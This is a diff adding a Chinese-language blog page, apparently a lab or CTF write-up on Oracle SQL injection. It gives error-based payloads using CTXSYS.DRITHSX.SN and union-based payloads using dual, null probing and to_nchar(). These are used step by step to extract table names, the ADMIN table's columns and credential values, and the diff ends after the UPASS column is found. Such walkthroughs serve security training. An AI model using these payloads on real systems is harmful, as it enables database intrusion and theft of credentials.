@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.15.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="SQL注入-Oracle报错注入 Oracle概述1、Oracle数据库属于甲骨文公司，关系型数据库管理系统，数据库 2、讲究语法严谨select 字段名 from 表名 3、dual表—&gt;虚表 专门用于满足数据库语句结构的表大部分数据库是数据敏感大小写，语句是不敏感大小写 4、Oracle系统自带表：没有库的概念，只有用户的概念查询出所有的表： select from all_tables">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入-Oracle报错注入">
+<meta property="og:url" content="http://example.com/2022/11/25/SQL%E6%B3%A8%E5%85%A5-Oracle%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="kilig&#39;s Blog">
+<meta property="og:description" content="SQL注入-Oracle报错注入 Oracle概述1、Oracle数据库属于甲骨文公司，关系型数据库管理系统，数据库 2、讲究语法严谨select 字段名 from 表名 3、dual表—&gt;虚表 专门用于满足数据库语句结构的表大部分数据库是数据敏感大小写，语句是不敏感大小写 4、Oracle系统自带表：没有库的概念，只有用户的概念查询出所有的表： select from all_tables">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021041017563360.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410175542770.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410175559562.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021041017560847.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410175702437.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410175825468.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410175909250.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410175924842.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021041017594789.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021041018000350.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180015188.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180121421.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021041018013394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180145812.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180203205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180215990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180247598.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180303105.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180313980.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/202104101803266.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180338814.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180358596.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180412842.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180429904.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180455546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021041018053825.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180600650.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180632698.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180721607.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180815231.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180831815.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180850196.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410180920338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2022-11-25T02:30:48.000Z">
+<meta property="article:modified_time" content="2023-03-07T13:28:35.835Z">
+<meta property="article:author" content="kiligwh">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/2021041017563360.png">
+
+
+<link rel="canonical" href="http://example.com/2022/11/25/SQL%E6%B3%A8%E5%85%A5-Oracle%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2022/11/25/SQL%E6%B3%A8%E5%85%A5-Oracle%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","path":"2022/11/25/SQL注入-Oracle报错注入/","title":"SQL注入-Oracle报错注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQL注入-Oracle报错注入 | kilig's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">kilig's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">If it is a rose,it will blossom</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5-Oracle%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">SQL注入-Oracle报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Oracle%E6%A6%82%E8%BF%B0"><span class="nav-number">1.1.</span> <span class="nav-text">Oracle概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.</span> <span class="nav-text">显错注入</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="kiligwh"
+      src="/images/kilig.gif">
+  <p class="site-author-name" itemprop="name">kiligwh</p>
+  <div class="site-description" itemprop="description">欢迎</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/25/SQL%E6%B3%A8%E5%85%A5-Oracle%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kilig.gif">
+      <meta itemprop="name" content="kiligwh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kilig's Blog">
+      <meta itemprop="description" content="欢迎">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SQL注入-Oracle报错注入 | kilig's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入-Oracle报错注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-11-25 10:30:48" itemprop="dateCreated datePublished" datetime="2022-11-25T10:30:48+08:00">2022-11-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-07 21:28:35" itemprop="dateModified" datetime="2023-03-07T21:28:35+08:00">2023-03-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="SQL注入-Oracle报错注入"><a href="#SQL注入-Oracle报错注入" class="headerlink" title="SQL注入-Oracle报错注入"></a>SQL注入-Oracle报错注入</h1><hr>
+<h2 id="Oracle概述"><a href="#Oracle概述" class="headerlink" title="Oracle概述"></a>Oracle概述</h2><p>1、Oracle数据库属于甲骨文公司，关系型数据库管理系统，数据库</p>
+<p>2、讲究语法严谨<br>select 字段名 from 表名</p>
+<p>3、dual表—&gt;虚表 专门用于满足数据库语句结构的表<br>大部分数据库是数据敏感大小写，语句是不敏感大小写</p>
+<p>4、Oracle系统自带表：<br>没有库的概念，只有用户的概念<br>查询出所有的表： select from all_tables<br>查询用户所创建的表：select from user_tables<br>查询所有的字段：select from all_tab_columns<br>查询出用户的字段：select from user_tab_columns<br>查版本：select * from v$version<br>order by 排序<br>user_tables 用于存放用户创建的表名等(表中字段名有 table_name)<br>user_tab_columns 用于存放用户创建的字段名等(表中的字段名有table_name,column_name)</p>
+<p>5、页面往往只会返回一条数据<br>rownum字段 Oracle数据库会在表中自动加上rownum字段，起到统计作用</p>
+<p>6、Oracle数据库不支持limit</p>
+<p>7、a &lt;&gt; b &#x3D;&#x3D;&gt; a不等于b</p>
+<p>8、不能使用limit 但可以使用别名</p>
+<p>子查询，将查询出来的数据rownnum 起个别名 ，子查询出来的数据可以是一张表<br>select * from (select rownum no,table_name from user_tab_columns) where no &#x3D;1<br>select rownum no,table_name from user_tab_columns 将查询出来的table_name字段和no字段 作为新的一张表</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>所用函数<br>CTXSYS.DRITHSX.SN（user,(SQL语句)）<br>去查询关于主题的对应关键词，然后因为查询失败（应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出未查询到的错误从而爆出查询的内容）</p>
+<p>1、查出表名<br>构造payload:</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="number">1</span>,(<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> (<span class="keyword">select</span> rownum num,<span class="built_in">table_name</span> <span class="keyword">from</span> user_tables) </span><br><span class="line"><span class="keyword">where</span> num=<span class="number">1</span>)）</span><br></pre></td></tr></table></figure>
+
+<p>分析：<br>从(select rownum num,table_name from user_tables) 里面查询字段table_name的值<br>select rownum num,table_name from user_tables<br>&#x3D;&#x3D;》查询user_tables表中的table_name字段,并将rownum取别名 num<br>当num&#x3D;1时，取出num等于1所在行的table_name值并返回给上层的table_name<br><img src="https://img-blog.csdnimg.cn/2021041017563360.png" alt="在这里插入图片描述"></p>
+<p>得出第一个表名NEWS<br><img src="https://img-blog.csdnimg.cn/20210410175542770.png" alt="在这里插入图片描述"></p>
+<p>将num&#x3D;1改为num&#x3D;2<br>得出第二张表名MD5<br><img src="https://img-blog.csdnimg.cn/20210410175559562.png" alt="在这里插入图片描述"></p>
+<p>将num&#x3D;2改为num&#x3D;3<br>得出第三张表名ADMIN<br><img src="https://img-blog.csdnimg.cn/2021041017560847.png" alt="在这里插入图片描述"></p>
+<p>将num&#x3D;3改为num&#x3D;4<br>没有信息<br><img src="https://img-blog.csdnimg.cn/20210410175702437.png" alt="在这里插入图片描述"></p>
+<p>得出共三张表 ADMIN MD5 NEWS</p>
+<p>2、构造payload得出ADMIN表中的字段名</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’ <span class="keyword">and</span> rownum=<span class="number">1</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span></span><br><span class="line"> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’ <span class="keyword">and</span> rownum=<span class="number">1</span>)）</span><br></pre></td></tr></table></figure>
+
+<p>查出第一个字段名UNAME<br><img src="https://img-blog.csdnimg.cn/20210410175825468.png" alt="在这里插入图片描述"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’ </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt;’UNAME’)</span><br></pre></td></tr></table></figure>
+
+<p>得出第二个字段名UPASS<br><img src="https://img-blog.csdnimg.cn/20210410175909250.png" alt="在这里插入图片描述"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’ <span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt;’UNAME’ <span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt;’UPASS’)）</span><br></pre></td></tr></table></figure>
+
+<p>没有信息<br><img src="https://img-blog.csdnimg.cn/20210410175924842.png" alt="在这里插入图片描述"></p>
+<p>ADMIN表共2个字段 UNAME UPASS</p>
+<p>3、构造payload，查出数据信息</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> uname <span class="keyword">from</span> (<span class="keyword">select</span> rownum num,uname,upass <span class="keyword">from</span> <span class="keyword">admin</span>) <span class="keyword">where</span> num=<span class="number">1</span>)）</span><br><span class="line">uanme的第一个值为OCI</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2021041017594789.png" alt="在这里插入图片描述"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> uname <span class="keyword">from</span> (<span class="keyword">select</span> rownum num,uname,upass <span class="keyword">from</span> <span class="keyword">admin</span>) <span class="keyword">where</span> num=<span class="number">2</span>)）</span><br><span class="line">uname的第二个值是NF</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2021041018000350.png" alt="在这里插入图片描述"></p>
+<p>查出NF的upass字段信息</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> upass <span class="keyword">from</span> (<span class="keyword">select</span> rownum num,uname,upass <span class="keyword">from</span> <span class="keyword">admin</span>) <span class="keyword">where</span> num=<span class="number">2</span>)）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210410180015188.png" alt="在这里插入图片描述"></p>
+<p>4、得到flag，通关</p>
+<h2 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h2><p>1、进入靶场<br><img src="https://img-blog.csdnimg.cn/20210410180121421.png" alt="在这里插入图片描述"></p>
+<p>2、使用and 1&#x3D;1，正常<br><img src="https://img-blog.csdnimg.cn/2021041018013394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>3、使用and 1&#x3D;2，报错<br><img src="https://img-blog.csdnimg.cn/20210410180145812.png" alt="在这里插入图片描述"></p>
+<p>4、存在注入点，使用order by 判断字段数<br>order by 5 报错<br><img src="https://img-blog.csdnimg.cn/20210410180203205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>order by 4 正常<br><img src="https://img-blog.csdnimg.cn/20210410180215990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>得出字段数为4</p>
+<p>5、使用联合查询 探测输出点<br>构造payload：-1 union select 1,2,3,4 报错<br><img src="https://img-blog.csdnimg.cn/20210410180247598.png" alt="在这里插入图片描述"></p>
+<p>6、不是MySQL数据库，试一试dual表呢<br>构造payload：-1 union select 1,2,3,4 from dual<br>还是报错<br><img src="https://img-blog.csdnimg.cn/20210410180303105.png" alt="在这里插入图片描述"></p>
+<p>7、会不会是数据类型呢？<br>构造payload：-1 union select null,null,null,null from dual<br>没有报错</p>
+<p><img src="https://img-blog.csdnimg.cn/20210410180313980.png" alt="在这里插入图片描述"></p>
+<p>8、探测4个字段数的数据类型<br>改第一个null为1<br>无变化，知第一个null为数字型<br><img src="https://img-blog.csdnimg.cn/202104101803266.png" alt="在这里插入图片描述"></p>
+<p>改第二个字段数null分别为1，‘a’ 都是报错<br><img src="https://img-blog.csdnimg.cn/20210410180338814.png" alt="在这里插入图片描述"></p>
+<p>第三个字段数与第二个相同，都是报错<br><img src="https://img-blog.csdnimg.cn/20210410180358596.png" alt="在这里插入图片描述"></p>
+<p>探测第四个字段数，改null为2<br>有变化<br><img src="https://img-blog.csdnimg.cn/20210410180412842.png" alt="在这里插入图片描述"></p>
+<p>会不会是一个时间戳类型的呢 将2改为当前的时间戳填入<br><img src="https://img-blog.csdnimg.cn/20210410180429904.png" alt="在这里插入图片描述"></p>
+<p>确认第一个为数字型，第四个为时间戳，第二、三个不知</p>
+<p>9、试一试to_nchar()<br>to_nchar()将varchar2转为nvarchar2<br>有回显<br><img src="https://img-blog.csdnimg.cn/20210410180455546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>10、构造payload查出表名</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> user_tables</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, to_nchar(<span class="built_in">table_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tables</span><br></pre></td></tr></table></figure>
+
+<p>查出一个表名 ADMIN<br><img src="https://img-blog.csdnimg.cn/2021041018053825.png" alt="在这里插入图片描述"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, to_nchar(<span class="built_in">table_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tables <span class="keyword">where</span> <span class="built_in">table_name</span> &lt;&gt; ‘<span class="keyword">ADMIN</span>’</span><br></pre></td></tr></table></figure>
+
+<p>查出第二个表名 MD5<br><img src="https://img-blog.csdnimg.cn/20210410180600650.png" alt="在这里插入图片描述"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, to_nchar(<span class="built_in">table_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tables <span class="keyword">where</span> <span class="built_in">table_name</span> &lt;&gt; ‘<span class="keyword">ADMIN</span>’ <span class="keyword">and</span> </span><br><span class="line"><span class="built_in">table_name</span> &lt;&gt; ‘MD5’</span><br></pre></td></tr></table></figure>
+
+<p>查出第三个表名 NEWS<br><img src="https://img-blog.csdnimg.cn/20210410180632698.png" alt="在这里插入图片描述"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, to_nchar(<span class="built_in">table_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tables <span class="keyword">where</span> <span class="built_in">table_name</span> &lt;&gt; ‘<span class="keyword">ADMIN</span>’ </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">table_name</span> &lt;&gt; ‘MD5’ <span class="keyword">and</span> <span class="built_in">table_name</span> &lt;&gt;’NEWS’</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210410180721607.png" alt="在这里插入图片描述"></p>
+<p>共三个表名：ADMIN MD5 NEWS</p>
+<p>11、flag可能在admin表中，查出admin表的字段名<br>构造payload：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’</span><br><span class="line">id=<span class="number">1.2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,to_nchar(<span class="built_in">column_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’</span><br></pre></td></tr></table></figure>
+
+<p>得到第一个字段名 UNAME<br><img src="https://img-blog.csdnimg.cn/20210410180815231.png" alt="在这里插入图片描述"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,to_nchar(<span class="built_in">column_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’ </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt; ‘UNAME’</span><br></pre></td></tr></table></figure>
+
+<p>得到第二个字段名 UPASS<br><img src="https://img-blog.csdnimg.cn/20210410180831815.png" alt="在这里插入图片描述"></p>
